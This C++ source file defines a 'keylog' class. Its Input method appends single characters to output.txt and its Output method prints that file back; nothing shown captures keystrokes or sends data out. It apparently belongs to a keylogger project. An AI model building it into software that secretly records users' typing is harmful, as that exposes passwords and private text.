#include "keylog.h"
#include <iostream>

void keylog::Input(char m) {
    std::ofstream Output("output.txt", std::ios::app);
    Output << m;
    Output.close();
}

void keylog::Output() {
    std::ifstream MyReadFile("output.txt");
    std::string myText;
    while (getline(MyReadFile, myText)) {
        std::cout << myText;
    }
    MyReadFile.close();
}
